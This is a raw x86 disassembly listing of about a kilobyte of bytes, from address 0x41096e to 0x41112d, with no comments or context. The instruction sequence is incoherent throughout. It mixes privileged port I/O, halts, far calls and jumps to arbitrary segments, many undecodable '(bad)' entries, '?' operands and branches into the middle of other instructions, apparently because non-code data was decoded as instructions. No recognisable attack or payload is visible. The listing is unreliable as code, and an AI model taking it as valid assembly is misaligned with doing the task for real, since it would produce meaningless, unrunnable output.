  41096e:	xor    esp,esi
  410970:	or     BYTE PTR [edx],bl
  410972:	adc    cl,al
  410974:	ret    
  410975:	nop
  410976:	pop    ebp
  410977:	xchg   ebx,eax
  410978:	jge    0x410905
  41097a:	aaa    
  41097b:	daa    
  41097c:	xor    dl,BYTE PTR [ecx-0x6d]
  41097f:	sbb    eax,0x434ee0a8
  410984:	mov    ds:0x4d5736f0,eax
  410989:	ins    DWORD PTR es:[edi],dx
  41098a:	cs retf 0xfe
  41098e:	dec    esp
  41098f:	and    dh,BYTE PTR [ebp-0x7]
  410992:	jno    0x4109bc
  410994:	cli    
  410995:	sub    bl,BYTE PTR [bx+di-0x77f8]
  41099a:	xor    BYTE PTR [ebx+0x16ca4f62],0xcc
  4109a1:	lock test al,0x94
  4109a4:	sbb    al,0xee
  4109a6:	pop    edx
  4109a7:	jne    0x4109d9
  4109a9:	repnz mov dl,0x49
  4109ac:	mov    edi,0xb3771ec8
  4109b1:	mov    ch,0xd0
  4109b3:	pop    ecx
  4109b4:	sub    eax,0xc1fe8159
  4109b9:	push   0xb073d871
  4109be:	out    0x29,eax
  4109c0:	and    dh,dl
  4109c2:	xchg   ecx,eax
  4109c3:	ror    BYTE PTR [edi],cl
  4109c5:	and    al,0xaa
  4109c7:	mov    DWORD PTR [eax+0x72],edx
  4109ca:	or     eax,0x5037af95
  4109cf:	stc    
  4109d0:	ret    
  4109d1:	xchg   ecx,eax
  4109d2:	pop    ebx
  4109d3:	sub    esi,edi
  4109d5:	jmp    0x4f67:0x9bf736de
  4109dc:	test   ebx,esp
  4109de:	pop    ds
  4109df:	outs   dx,DWORD PTR ds:[esi]
  4109e0:	xchg   esi,eax
  4109e1:	lock inc esi
  4109e3:	nop
  4109e4:	xchg   ecx,eax
  4109e5:	div    esp
  4109e7:	scas   al,BYTE PTR es:[edi]
  4109e8:	add    ebp,DWORD PTR ds:0x50e3a1ac
  4109ee:	xchg   ebx,edi
  4109f0:	hlt    
  4109f1:	jb     0x41099a
  4109f3:	cmp    esi,DWORD PTR [eax+0x64d86ccb]
  4109f9:	icebp  
  4109fa:	leave  
  4109fb:	dec    edi
  4109fc:	push   ds
  4109fd:	adc    eax,0x900b34c9
  410a02:	int    0xfa
  410a04:	or     DWORD PTR es:[esi+0x28],edx
  410a08:	mov    ebx,0x36279ed
  410a0d:	jle    0x410a10
  410a0f:	stos   BYTE PTR es:[edi],al
  410a10:	leave  
  410a11:	cwd    
  410a13:	lea    ebx,[ecx-0x52]
  410a16:	push   cs
  410a17:	aaa    
  410a18:	or     BYTE PTR [edx+0xd],dh
  410a1b:	(bad)  [edi-0x6e47217a]
  410a21:	test   BYTE PTR [ecx-0x66bb576d],cl
  410a27:	into   
  410a28:	xchg   ecx,eax
  410a29:	lock or BYTE PTR [ecx-0x53],ah
  410a2d:	inc    esi
  410a2e:	push   ss
  410a2f:	xchg   DWORD PTR [ebx+0xa3be47b],esi
  410a35:	xchg   ecx,eax
  410a36:	xchg   ebx,ecx
  410a38:	adc    eax,DWORD PTR [ebp+edx*4-0x3c]
  410a3c:	mov    ?,esi
  410a3e:	shr    cx,0x83
  410a42:	bts    DWORD PTR [edi+0xa7c6829],edx
  410a49:	and    bl,BYTE PTR [eax]
  410a4b:	xor    al,0xcf
  410a4d:	jo     0x410a75
  410a4f:	mov    ch,0xce
  410a51:	mov    cl,0x3
  410a53:	jge    0x410ab0
  410a55:	add    ebp,DWORD PTR [eax]
  410a57:	mov    dh,BYTE PTR [ebx]
  410a59:	inc    ecx
  410a5a:	iret   
  410a5b:	pop    eax
  410a5c:	push   ecx
  410a5d:	in     al,dx
  410a5e:	test   BYTE PTR [edi-0x5bf2ff99],bl
  410a64:	div    DWORD PTR [ebx-0x4c0ccc41]
  410a6a:	stos   BYTE PTR es:[edi],al
  410a6b:	mov    esi,esp
  410a6d:	adc    BYTE PTR [eax],0xce
  410a70:	or     bh,cl
  410a72:	into   
  410a73:	or     BYTE PTR ds:[ecx],0x13
  410a77:	inc    ebx
  410a78:	or     esp,eax
  410a7a:	push   edx
  410a7b:	mov    ds,WORD PTR [esi+eiz*2]
  410a7e:	lods   al,BYTE PTR ds:[esi]
  410a7f:	inc    ebp
  410a80:	loope  0x410a73
  410a82:	add    al,0xe8
  410a84:	and    BYTE PTR [edi+0x3c0e6809],dl
  410a8a:	push   eax
  410a8b:	fstp   TBYTE PTR [ebx+eiz*4-0x78]
  410a8f:	cmc    
  410a90:	call   0xbcaef5c9
  410a95:	out    0xf2,eax
  410a97:	mov    ebp,0xf4aba3
  410a9c:	xchg   edx,eax
  410a9d:	and    al,BYTE PTR [esi+0x176c096e]
  410aa3:	int3   
  410aa4:	xchg   esi,eax
  410aa5:	or     dl,BYTE PTR [eax-0x61b6856d]
  410aab:	(bad)  
  410aac:	neg    edi
  410aae:	sbb    DWORD PTR [eax],esp
  410ab0:	cli    
  410ab1:	xor    DWORD PTR ds:0xde740879,ebp
  410ab7:	or     al,0xd
  410ab9:	jmp    0xe30:0xf0ffa7d0
  410ac0:	jmp    0x3948:0x5923ed6f
  410ac7:	mov    bl,0x4b
  410ac9:	popa   
  410aca:	xchg   edx,eax
  410acb:	pop    ds
  410acc:	pop    ss
  410acd:	cld    
  410ace:	loop   0x410aaa
  410ad0:	ja     0x410b2f
  410ad2:	scas   al,BYTE PTR es:[edi]
  410ad3:	out    dx,al
  410ad4:	or     al,0x6b
  410ad6:	or     eax,0x1a8c5278
  410adb:	(bad)  
  410adc:	xor    eax,0x361e131e
  410ae1:	jge    0x410b28
  410ae3:	pop    ebx
  410ae4:	mov    WORD PTR [esi+eax*8],cs
  410ae7:	and    cl,BYTE PTR [edi-0x3b]
  410aea:	and    eax,0xeb7808a8
  410aef:	xchg   ebp,eax
  410af0:	icebp  
  410af1:	mov    BYTE PTR fs:[ebp-0x1a4f0e33],0x52
  410af9:	inc    esi
  410afa:	jmp    0x64617bdf
  410aff:	iret   
  410b00:	pop    ebp
  410b01:	xchg   edx,eax
  410b02:	test   DWORD PTR [edi],eax
  410b04:	mov    ds:0xbf89c4a0,eax
  410b09:	lock inc esi
  410b0b:	mov    esp,0xb683f605
  410b10:	cdq    
  410b11:	test   BYTE PTR es:[ecx-0x324333d7],al
  410b18:	jbe    0x410ad8
  410b1a:	xchg   BYTE PTR [edi],cl
  410b1c:	cdq    
  410b1d:	or     dh,0x27
  410b20:	not    DWORD PTR [ebx-0x49]
  410b23:	add    al,0xa8
  410b25:	in     al,0x9a
  410b27:	jno    0x410b28
  410b29:	jp     0x410afd
  410b2b:	icebp  
  410b2c:	mov    cl,0x45
  410b2e:	stos   DWORD PTR es:[edi],eax
  410b2f:	fild   WORD PTR [edi-0x11]
  410b32:	test   DWORD PTR [ebx],esi
  410b34:	rol    BYTE PTR [ebx-0x53069123],1
  410b3a:	int3   
  410b3b:	push   es
  410b3c:	or     ebp,ebx
  410b3e:	repz sub BYTE PTR [ebx-0x1058ed6a],bh
  410b45:	lock push DWORD PTR [ebx+0x66]
  410b49:	call   0x7e1a:0xf0ed6895
  410b50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b51:	add    BYTE PTR [esi],bh
  410b53:	ds mov ch,0xf5
  410b56:	pop    eax
  410b57:	test   al,al
  410b59:	arpl   WORD PTR [esi-0x6a58925d],ax
  410b5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b60:	aas    
  410b61:	rcr    dh,1
  410b63:	sub    BYTE PTR [ebx+0x7],dh
  410b66:	sbb    BYTE PTR ds:0x33669409,0x2b
  410b6d:	es leave 
  410b6f:	hlt    
  410b70:	jmp    0xefdedc18
  410b75:	jns    0x410bc8
  410b77:	sub    ecx,esp
  410b79:	test   eax,0x562d6719
  410b7e:	sub    eax,0x382df737
  410b83:	ja     0x410b64
  410b85:	dec    ebx
  410b86:	sbb    dl,bl
  410b88:	adc    esi,esi
  410b8a:	adc    ah,al
  410b8c:	sbb    eax,0x8752d85c
  410b91:	aas    
  410b92:	sahf   
  410b93:	jno    0x410b9d
  410b95:	push   eax
  410b96:	fwait
  410b97:	test   eax,0xf302460c
  410b9c:	add    esi,ecx
  410b9e:	bound  esi,QWORD PTR [ebx]
  410ba0:	repnz dec esi
  410ba2:	pushf  
  410ba3:	hlt    
  410ba4:	xchg   ecx,eax
  410ba5:	dec    edi
  410ba6:	fbld   TBYTE PTR [esi+0x7]
  410ba9:	enter  0xcff6,0x8
  410bad:	pop    ebx
  410bae:	mov    esi,0xbc3afe8d
  410bb3:	or     eax,0x28668b33
  410bb8:	arpl   WORD PTR [esi+eiz*8+0x71],di
  410bbc:	icebp  
  410bbd:	inc    ecx
  410bbe:	fist   DWORD PTR [esi]
  410bc0:	push   ecx
  410bc1:	loopne 0x410bbc
  410bc3:	mov    cs,WORD PTR [eax]
  410bc5:	inc    edx
  410bc6:	shl    DWORD PTR [eax+0x2b],1
  410bc9:	call   0x6772db27
  410bce:	icebp  
  410bcf:	sub    BYTE PTR [esi-0x62],al
  410bd2:	mov    bl,0x2c
  410bd4:	js     0x410b66
  410bd6:	in     eax,0xee
  410bd8:	hlt    
  410bd9:	adc    BYTE PTR [esi],al
  410bdb:	sub    DWORD PTR [edi],edi
  410bdd:	mov    bl,0x1d
  410bdf:	jnp    0x410b7c
  410be1:	mov    edx,0xe90f2872
  410be6:	or     al,BYTE PTR [ecx]
  410be8:	or     BYTE PTR [esi-0x4633c5f],dh
  410bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bef:	aaa    
  410bf0:	lods   al,BYTE PTR ds:[esi]
  410bf1:	int    0x68
  410bf3:	or     bh,dl
  410bf5:	icebp  
  410bf6:	cmp    eax,DWORD PTR [ebx-0x40]
  410bf9:	lds    edi,FWORD PTR [ecx-0x28df75c]
  410bff:	das    
  410c00:	adc    ah,cl
  410c02:	xchg   esi,eax
  410c03:	test   cl,ch
  410c05:	icebp  
  410c06:	loop   0x410c57
  410c08:	pop    ds
  410c09:	pop    ss
  410c0a:	clc    
  410c0b:	inc    ebx
  410c0c:	lahf   
  410c0d:	mov    BYTE PTR [ebp-0x4137edde],al
  410c13:	aaa    
  410c14:	lock push edi
  410c16:	pop    es
  410c17:	mov    ds:0x5deef04b,al
  410c1c:	test   BYTE PTR [edx+0x76ad7514],ch
  410c22:	std    
  410c23:	lods   al,BYTE PTR ds:[esi]
  410c24:	jo     0x410c8e
  410c26:	xchg   DWORD PTR [ebx],esp
  410c28:	xchg   esi,eax
  410c29:	xchg   edi,eax
  410c2a:	xlat   BYTE PTR ds:[ebx]
  410c2b:	call   0xdfe6:0x2b8f9d7f
  410c32:	fstp   TBYTE PTR [edi-0x34a89789]
  410c38:	or     DWORD PTR [edx+0x2d4801f],esp
  410c3e:	(bad)  
  410c41:	or     al,BYTE PTR [edx-0x300f2edd]
  410c47:	sub    DWORD PTR [ebp-0x8e4eca5],esi
  410c4d:	jecxz  0x410c8a
  410c4f:	dec    eax
  410c50:	inc    ebp
  410c51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c52:	push   ebx
  410c53:	ss mov bl,0xf0
  410c56:	add    al,0x2d
  410c58:	enter  0x779c,0x56
  410c5c:	pop    ds
  410c5d:	stos   DWORD PTR es:[edi],eax
  410c5e:	push   0x87108389
  410c63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c64:	push   0x4b
  410c66:	into   
  410c67:	mov    ebp,0xeda4f131
  410c6c:	xchg   bh,dl
  410c6e:	repz dec esp
  410c70:	sbb    eax,0x37ea38af
  410c75:	xchg   ebx,eax
  410c76:	test   BYTE PTR [ebp-0x6ce52af5],ah
  410c7c:	loope  0x410c8b
  410c7e:	push   es
  410c7f:	lods   al,BYTE PTR ds:[esi]
  410c80:	cmp    ebx,0x717f290c
  410c86:	data16 in al,0x9
  410c89:	call   0x92699dd
  410c8e:	aad    0x78
  410c90:	or     dh,cl
  410c92:	sbb    bh,BYTE PTR [edi]
  410c94:	cld    
  410c95:	pop    ebx
  410c96:	push   ss
  410c97:	add    BYTE PTR ds:0xddfca8aa,dh
  410c9d:	cmp    eax,0x77897d87
  410ca2:	inc    esp
  410ca3:	ja     0x410c4a
  410ca5:	or     bh,BYTE PTR [ebx+0x29]
  410ca8:	imul   BYTE PTR [ebx-0x13f6a57b]
  410cae:	mov    dh,0x87
  410cb0:	rcr    BYTE PTR [edx-0xed6ef4c],1
  410cb6:	es out 0x8c,al
  410cb9:	enter  0x6d68,0xb8
  410cbd:	or     al,0xc
  410cbf:	mov    ebp,0xb19ab578
  410cc4:	mov    eax,0x256cd33f
  410cc9:	or     BYTE PTR [esi+0x959a5e8],0x29
  410cd0:	xchg   esi,eax
  410cd1:	adc    al,0x7
  410cd3:	popf   
  410cd4:	jne    0x410d48
  410cd6:	std    
  410cd7:	and    eax,ecx
  410cd9:	retf   
  410cda:	adc    DWORD PTR [eax],ebp
  410cdc:	inc    ebx
  410cdd:	js     0x410d47
  410cdf:	(bad)  
  410ce0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ce1:	test   DWORD PTR [edx+0x7834ba15],ebx
  410ce7:	test   al,0x1c
  410ce9:	aam    0x6b
  410ceb:	sub    DWORD PTR [ecx-0x1f627749],esp
  410cf1:	lahf   
  410cf2:	pop    ecx
  410cf3:	add    DWORD PTR [edx+edi*8-0xef947fa],esp
  410cfa:	inc    esi
  410cfb:	or     DWORD PTR [edi+0x76b3571e],edx
  410d01:	bound  ecx,QWORD PTR [esi]
  410d03:	fnstenv ds:0x3ba38799
  410d09:	dec    ecx
  410d0a:	fidivr WORD PTR [eax]
  410d0c:	imul   ecx,edx,0x81d28d4
  410d12:	int    0xf7
  410d14:	cld    
  410d15:	mov    eax,ds:0x9852c48c
  410d1a:	xchg   BYTE PTR ds:0xfb1bab48,cl
  410d20:	xor    DWORD PTR [ebp+edi*4-0x2aaa4052],ebx
  410d27:	scas   al,BYTE PTR es:[edi]
  410d28:	pop    edi
  410d29:	xchg   DWORD PTR [esi-0x78],esp
  410d2c:	das    
  410d2d:	in     al,dx
  410d2e:	xchg   BYTE PTR [ebx-0x41],ch
  410d31:	pop    ebp
  410d32:	mov    dh,0x8b
  410d34:	jae    0x410d1d
  410d36:	xchg   ecx,eax
  410d37:	sub    DWORD PTR [esi],esi
  410d39:	outs   dx,BYTE PTR ds:[esi]
  410d3a:	jmp    0x60e915d7
  410d3f:	inc    ebx
  410d40:	loopne 0x410cd1
  410d42:	xchg   esi,eax
  410d43:	sar    ch,cl
  410d45:	xor    DWORD PTR ds:0x7d85211e,ebp
  410d4b:	sub    BYTE PTR [edx],bl
  410d4d:	sar    esi,cl
  410d4f:	(bad)  
  410d50:	jo     0x410d44
  410d52:	cmp    eax,0x4d827732
  410d57:	sub    esi,ebp
  410d59:	adc    cl,BYTE PTR [bx-0x4]
  410d5d:	icebp  
  410d5e:	lods   al,BYTE PTR ds:[esi]
  410d5f:	int    0x19
  410d61:	test   edi,esi
  410d63:	pop    ds
  410d64:	mov    WORD PTR [ecx],?
  410d66:	setl   BYTE PTR [esi]
  410d69:	popf   
  410d6a:	xchg   bl,ch
  410d6c:	pop    esi
  410d6d:	fdivr  st(2),st
  410d6f:	cmc    
  410d70:	or     ecx,esi
  410d72:	and    eax,0x61861c29
  410d77:	into   
  410d78:	or     BYTE PTR [eax],bh
  410d7a:	pop    ebx
  410d7b:	shr    cl,cl
  410d7d:	mov    ebx,0xf7d3adff
  410d82:	xor    bh,BYTE PTR [ecx-0x597ec517]
  410d88:	pop    eax
  410d89:	mov    DWORD PTR [edi-0x2555f7b2],ecx
  410d8f:	cdq    
  410d90:	sbb    al,0x5b
  410d92:	ja     0x410dd6
  410d94:	popf   
  410d95:	icebp  
  410d96:	inc    edx
  410d97:	inc    ebp
  410d98:	cs stc 
  410d9a:	and    dh,ch
  410d9c:	into   
  410d9d:	popf   
  410d9e:	mov    bl,0xaf
  410da0:	dec    eax
  410da1:	data16 xchg BYTE PTR [ebp+0x57],ah
  410da5:	xor    eax,0x84c3b29a
  410daa:	ja     0x410dd4
  410dac:	or     eax,esp
  410dae:	and    dl,BYTE PTR [edi]
  410db0:	neg    DWORD PTR [ecx+0x41]
  410db3:	dec    edx
  410db4:	mov    bl,0x5
  410db6:	push   edx
  410db7:	dec    esi
  410db8:	test   BYTE PTR cs:[edx],0xfe
  410dbc:	inc    edx
  410dbd:	sub    edi,DWORD PTR [ebx+0x2f]
  410dc0:	mov    bh,0x41
  410dc2:	jno    0x410dff
  410dc4:	or     dh,BYTE PTR [edx+0x26733854]
  410dca:	pushf  
  410dcb:	scas   eax,DWORD PTR es:[edi]
  410dcc:	loop   0x410db5
  410dce:	rcr    cl,cl
  410dd0:	push   ss
  410dd1:	jmp    FWORD PTR [esi+0x7c]
  410dd4:	sub    ah,BYTE PTR [esi+0x62]
  410dd7:	xchg   ebp,eax
  410dd8:	fimul  DWORD PTR [edx]
  410dda:	dec    ecx
  410ddb:	push   0x61
  410ddd:	sub    BYTE PTR [esi],ch
  410ddf:	nop
  410de0:	test   DWORD PTR [ecx],0x3c499f87
  410de6:	imul   edx,DWORD PTR [edi+eiz*8],0xffffff95
  410dea:	sub    dh,BYTE PTR [esi]
  410dec:	or     al,0xa
  410dee:	(bad)  
  410def:	je     0x410d79
  410df1:	test   al,0x4a
  410df3:	xchg   ebx,eax
  410df4:	or     BYTE PTR [eax],bl
  410df6:	or     edx,DWORD PTR [esp+eiz*8+0xb256451]
  410dfd:	mov    esp,?
  410dff:	fimul  DWORD PTR [eax]
  410e01:	pop    esi
  410e02:	xor    al,BYTE PTR [ebp-0x63]
  410e05:	or     edx,ebx
  410e07:	scas   eax,DWORD PTR es:[edi]
  410e08:	push   es
  410e09:	mov    al,ds:0x1d4001a2
  410e0e:	lock pop es
  410e10:	pop    ds
  410e11:	jns    0x410e79
  410e13:	retf   
  410e14:	mov    eax,DWORD PTR [edx-0x210ad7f8]
  410e1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e1b:	sahf   
  410e1c:	or     BYTE PTR [esi],dh
  410e1e:	jb     0x410e46
  410e20:	call   0xaac8:0xfad225cb
  410e27:	outs   dx,DWORD PTR ds:[esi]
  410e28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e29:	sub    cl,ah
  410e2b:	bound  ebp,QWORD PTR [ecx]
  410e2d:	xor    BYTE PTR [ecx+ebp*1+0xe],cl
  410e31:	pusha  
  410e32:	pop    ds
  410e33:	mov    eax,ds:0xcb87b6b1
  410e38:	jg     0x410dde
  410e3a:	fldenv [ebp+0x13]
  410e3d:	lock je 0x410e05
  410e40:	mov    ebp,0x4c9795c5
  410e45:	mov    ebx,edi
  410e47:	sti    
  410e48:	and    eax,0x1c83b892
  410e4d:	out    0x6,eax
  410e4f:	pop    esi
  410e50:	jnp    0x410e42
  410e52:	jle    0x410e31
  410e54:	mov    dh,ah
  410e56:	neg    edi
  410e58:	aaa    
  410e59:	xchg   ebx,eax
  410e5a:	stos   DWORD PTR es:[edi],eax
  410e5b:	inc    eax
  410e5c:	arpl   WORD PTR [ebx-0x221c6c7a],bx
  410e62:	clc    
  410e63:	mov    DWORD PTR [ebp-0x67],0xa6e02b51
  410e6a:	or     eax,0x61ed35cd
  410e6f:	push   0x29873f3e
  410e74:	jne    0x410e07
  410e76:	mov    ah,0xbd
  410e78:	mov    ds:0x292811fe,eax
  410e7d:	push   ecx
  410e7e:	shr    BYTE PTR [eax+edx*4+0x2c],cl
  410e82:	js     0x410e2a
  410e84:	push   ecx
  410e85:	pop    ss
  410e86:	fsubr  DWORD PTR [eax]
  410e88:	pop    es
  410e89:	(bad)  
  410e8a:	fst    st(5)
  410e8c:	frstpm(287 only) 
  410e8e:	inc    ecx
  410e8f:	xor    eax,0xbe1570b5
  410e94:	adc    al,dh
  410e96:	pop    ss
  410e97:	jg     0x410eb2
  410e99:	call   0x1e156ed6
  410e9e:	call   0x3428:0xd44673b2
  410ea5:	fldcw  WORD PTR [edi+0x52fa089d]
  410eab:	loop   0x410e9f
  410ead:	xor    BYTE PTR [eax-0x2fb7316],cl
  410eb3:	out    0x85,eax
  410eb5:	dec    eax
  410eb6:	pop    esp
  410eb7:	sub    BYTE PTR [eax],dh
  410eb9:	jmp    0xb43901aa
  410ebe:	lds    ecx,FWORD PTR [eax-0x5c]
  410ec1:	dec    ebx
  410ec2:	call   0x8a0:0xb08252bb
  410ec9:	ror    dh,cl
  410ecb:	xor    DWORD PTR [edi+0x2f],edi
  410ece:	and    ebx,DWORD PTR [eax-0x4006b1f8]
  410ed4:	imul   edx,DWORD PTR [eax],0x30575c1a
  410eda:	fstp   QWORD PTR [ebx]
  410edc:	xchg   edi,eax
  410edd:	sub    DWORD PTR [ebx],esi
  410edf:	sub    DWORD PTR [edx+ebx*8-0x45f71de8],esp
  410ee6:	int    0xc5
  410ee8:	or     eax,0x82972682
  410eed:	icebp  
  410eee:	(bad)  
  410eef:	outs   dx,BYTE PTR gs:[esi]
  410ef1:	jo     0x410f4c
  410ef3:	cmp    BYTE PTR [ebx+0x46],bl
  410ef6:	jmp    0x87cb7ba6
  410efb:	lea    edi,[edx]
  410efd:	mov    edx,DWORD PTR [edx-0x5f]
  410f00:	dec    ecx
  410f01:	jl     0x410ea6
  410f03:	sub    ah,dl
  410f05:	dec    ecx
  410f06:	stc    
  410f07:	cmp    bh,BYTE PTR [ebp-0x5e]
  410f0a:	ja     0x410f24
  410f0c:	gs rcr bl,cl
  410f0f:	sub    ebx,ebx
  410f11:	mov    esi,0x66db9556
  410f16:	imul   edx,DWORD PTR [eax],0xffffffa2
  410f19:	mov    ah,BYTE PTR [ebx+ebp*1]
  410f1c:	sub    al,0x69
  410f1e:	cmp    eax,0x598433af
  410f23:	push   ecx
  410f24:	ja     0x410ea7
  410f26:	nop
  410f27:	or     al,0x8c
  410f29:	mov    eax,0x8a3f2e67
  410f2e:	dec    ecx
  410f2f:	sub    BYTE PTR [ebx+0x6a],bl
  410f32:	aas    
  410f33:	sub    eax,0x18294008
  410f38:	xchg   edx,eax
  410f39:	sbb    al,0x6f
  410f3b:	rcl    BYTE PTR [ebp+ecx*4-0x1af68d3e],1
  410f42:	xchg   ecx,eax
  410f43:	push   es
  410f44:	add    eax,0x7b6c9c55
  410f49:	inc    eax
  410f4a:	imul   esi,ebx,0xe6e172f0
  410f50:	xchg   ecx,eax
  410f51:	ja     0x410eda
  410f53:	popf   
  410f54:	push   ebp
  410f55:	cli    
  410f56:	push   eax
  410f57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f58:	pop    ds
  410f59:	icebp  
  410f5a:	jbe    0x410f4c
  410f5c:	xchg   esp,eax
  410f5d:	jmp    0x67a5:0xe53f0782
  410f64:	fiadd  DWORD PTR [edx]
  410f66:	nop
  410f67:	repz xor BYTE PTR [ecx+0x602f350a],dh
  410f6e:	cmp    bh,BYTE PTR [eax]
  410f70:	and    esp,ecx
  410f72:	sbb    esi,DWORD PTR ds:0x29f96248
  410f78:	je     0x410faf
  410f7a:	mov    ebp,DWORD PTR [esi-0x5c]
  410f7d:	push   ebp
  410f7e:	xchg   BYTE PTR [ecx],ah
  410f80:	out    0xa8,ax
  410f83:	sbb    dh,bl
  410f85:	sbb    eax,0x978c2946
  410f8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f8c:	neg    DWORD PTR [ecx-0x3e149ba3]
  410f92:	dec    esp
  410f93:	rcl    BYTE PTR [eax-0x10],cl
  410f96:	es stos BYTE PTR es:[edi],al
  410f98:	jb     0x410f3a
  410f9a:	dec    esi
  410f9b:	sahf   
  410f9c:	inc    ebx
  410f9d:	aas    
  410f9e:	pop    ecx
  410f9f:	dec    ebx
  410fa0:	jge    0x410f49
  410fa2:	xchg   BYTE PTR [ecx],ah
  410fa4:	(bad)  
  410fa6:	stos   DWORD PTR es:[edi],eax
  410fa7:	call   0x29c30cb7
  410fac:	dec    esp
  410fad:	test   DWORD PTR [ecx+0x6f9e0677],esp
  410fb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fb4:	xor    BYTE PTR ds:0xd4e803e2,al
  410fba:	or     BYTE PTR [ecx],dh
  410fbc:	add    bh,ch
  410fbe:	test   BYTE PTR [esi-0x2cddbd08],dh
  410fc4:	or     cl,al
  410fc6:	std    
  410fc7:	fcmove st,st(7)
  410fc9:	dec    esp
  410fca:	pop    edx
  410fcb:	repnz sub eax,DWORD PTR [eax+0x59]
  410fcf:	add    DWORD PTR [ecx],ecx
  410fd1:	sahf   
  410fd2:	out    0xc4,al
  410fd4:	jne    0x410fc8
  410fd6:	repz adc eax,0x3d1a91dd
  410fdc:	out    0xf1,al
  410fde:	loopne 0x411020
  410fe0:	lock scas eax,DWORD PTR es:[edi]
  410fe2:	xor    BYTE PTR [eax-0x9],dl
  410fe5:	in     eax,0x21
  410fe7:	jle    0x410f9d
  410fe9:	pop    ebp
  410fea:	fsubrp st(4),st
  410fec:	shl    bl,0xbc
  410fef:	xchg   ebp,esp
  410ff1:	mov    ds:0x11dbcb22,al
  410ff6:	sbb    DWORD PTR [ecx],0x8e0129ef
  410ffc:	or     BYTE PTR [edi+ebx*2+0x29c7bd24],ch
  411003:	fsub   st(1),st
  411005:	xchg   al,dl
  411007:	ror    BYTE PTR [eax],cl
  411009:	mov    cl,0x54
  41100b:	push   ecx
  41100c:	cmp    al,0xf4
  41100e:	dec    ecx
  41100f:	lds    ecx,FWORD PTR [eax]
  411011:	push   ds
  411012:	jg     0x411043
  411014:	add    BYTE PTR [edx+edx*2],bh
  411017:	push   edi
  411018:	mov    eax,0x1b7fdf0d
  41101d:	inc    esp
  41101e:	inc    esi
  41101f:	adc    eax,0xa80cd1fe
  411024:	fs add al,0x28
  411027:	inc    esp
  411028:	into   
  411029:	xrelease xchg BYTE PTR [ebx-0x4d6014e9],bh
  411030:	jmp    0xe96a5e22
  411035:	idiv   dh
  411037:	push   edx
  411038:	loope  0x4110a6
  41103a:	mov    cl,0xd6
  41103c:	jbe    0x410ff4
  41103e:	test   DWORD PTR [ebp+0xb47f06c],edx
  411044:	fwait
  411045:	icebp  
  411046:	data16 jge 0x411070
  411049:	in     al,0x8f
  41104b:	into   
  41104c:	mov    bl,BYTE PTR [ecx+eiz*4-0x76b52376]
  411053:	cmp    DWORD PTR [ecx-0x5d2fb680],ebp
  411059:	xchg   BYTE PTR [edx-0x50],cl
  41105c:	or     BYTE PTR [esi+0x400b301e],al
  411062:	jae    0x410fe8
  411064:	sbb    edx,eax
  411066:	std    
  411067:	mov    ch,0x7
  411069:	lock cmp BYTE PTR [ebp+0x65176e8],bh
  411070:	xchg   ecx,eax
  411071:	jecxz  0x411079
  411073:	sub    bh,ah
  411075:	mov    ebx,esi
  411077:	bound  ecx,QWORD PTR [eax]
  411079:	sbb    bh,BYTE PTR [esi+0x715a6460]
  41107f:	inc    eax
  411080:	mov    ecx,edx
  411082:	pop    edx
  411083:	pop    edi
  411084:	call   0x86ab:0xfb30a309
  41108b:	push   cs
  41108c:	(bad)
  411090:	dec    esp
  411091:	mov    al,0xcf
  411093:	cmp    ecx,esp
  411095:	xlat   BYTE PTR ds:[ebx]
  411096:	xchg   DWORD PTR [edi-0x112b0ed5],esi
  41109c:	pushf  
  41109d:	sbb    eax,0xc458fcdc
  4110a2:	dec    ecx
  4110a3:	out    dx,al
  4110a4:	adc    BYTE PTR [edx],dh
  4110a6:	xchg   DWORD PTR [ecx-0x5c5f63da],ecx
  4110ac:	xchg   DWORD PTR [eax-0x25b2d777],eax
  4110b2:	inc    esp
  4110b3:	pop    ebp
  4110b4:	or     BYTE PTR [esp+ecx*1+0x7e247472],dl
  4110bb:	xor    DWORD PTR [edx-0xf],edi
  4110be:	jo     0x41104b
  4110c0:	mov    ds:0x8e59e01e,al
  4110c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110c6:	dec    edx
  4110c7:	cmp    al,0x73
  4110c9:	and    DWORD PTR [eax+0x1682c519],ebx
  4110cf:	test   al,0xb1
  4110d1:	cmp    DWORD PTR [esi],0xffffff81
  4110d4:	push   cs
  4110d5:	inc    ecx
  4110d6:	inc    ebx
  4110d7:	inc    esi
  4110d8:	push   edx
  4110d9:	nop
  4110da:	sti    
  4110db:	fwait
  4110dc:	add    al,0xe5
  4110de:	test   ch,bl
  4110e0:	dec    edx
  4110e1:	out    dx,al
  4110e2:	nop
  4110e3:	pop    ss
  4110e4:	sti    
  4110e5:	in     al,dx
  4110e6:	(bad)  
  4110e7:	mov    edi,0x61809069
  4110ec:	loope  0x411131
  4110ee:	or     DWORD PTR [esi],edx
  4110f0:	inc    ebx
  4110f1:	or     DWORD PTR [edi+0x12ac087e],eax
  4110f7:	lods   eax,DWORD PTR ds:[esi]
  4110f8:	div    DWORD PTR [ecx-0x60]
  4110fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110fc:	or     esi,ecx
  4110fe:	into   
  4110ff:	jnp    0x411100
  411101:	dec    esp
  411102:	ins    BYTE PTR es:[edi],dx
  411103:	jae    0x41109e
  411105:	cld    
  411106:	push   edx
  411107:	mov    esi,0xa78c941d
  41110c:	push   cs
  41110d:	mov    WORD PTR [ecx+0x7be18a12],?
  411113:	adc    eax,0x6eaaf0ee
  411118:	sub    al,0x92
  41111a:	pop    esp
  41111b:	in     al,0x6b
  41111d:	dec    esp
  41111e:	das    
  41111f:	pop    ecx
  411120:	aaa    
  411121:	mov    ebp,0x4e996587
  411126:	add    BYTE PTR [esi],ch
  411128:	aas    
  411129:	scas   al,BYTE PTR es:[edi]
  41112a:	and    ch,BYTE PTR [eax]
  41112c:	in     al,dx
  41112d:	jge    0x411185
